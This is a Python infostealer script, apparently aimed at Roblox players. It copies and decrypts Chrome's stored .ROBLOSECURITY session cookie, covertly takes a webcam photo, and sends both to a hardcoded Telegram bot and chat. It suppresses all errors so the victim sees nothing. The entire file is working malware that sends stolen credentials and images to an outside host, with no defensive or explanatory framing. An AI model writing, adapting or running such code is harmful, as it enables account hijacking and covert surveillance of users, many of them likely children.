import os
import shutil
import sqlite3
import requests
import cv2
import base64
from win32crypt import CryptUnprotectData

# Конфигурация
BOT_TOKEN = '8323830671:AAHm99BRauq9XOTqZgPS9KurQpP_EscAvms'
CHAT_ID = '-5249771325'

def send_to_tg(message, photo_path=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    if photo_path:
        with open(photo_path, 'rb') as f:
            requests.post(url + "sendPhoto", data={'chat_id': CHAT_ID}, files={'photo': f})
    else:
        requests.post(url + "sendMessage", data={'chat_id': CHAT_ID, 'text': message})

def get_roblox_cookie():
    # Путь к кукам браузера (на примере Chrome)
    path = os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default\\Network\\Cookies')
    temp_db = "temp.db"
    shutil.copyfile(path, temp_db)
    
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%' AND name='.ROBLOSECURITY'")
    
    results = []
    for name, value in cursor.fetchall():
        decrypted_value = CryptUnprotectData(value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        results.append(f"{name}: {decrypted_value}")
    
    conn.close()
    os.remove(temp_db)
    return "\n".join(results)

def take_photo():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite('shot.jpg', frame)
        send_to_tg("Фото с камеры:", photo_path='shot.jpg')
        os.remove('shot.jpg')
    cap.release()

if __name__ == "__main__":
    try:
        cookie = get_roblox_cookie()
        send_to_tg(f"Roblox Cookie found:\n{cookie}")
        take_photo()
    except Exception as e:
        pass
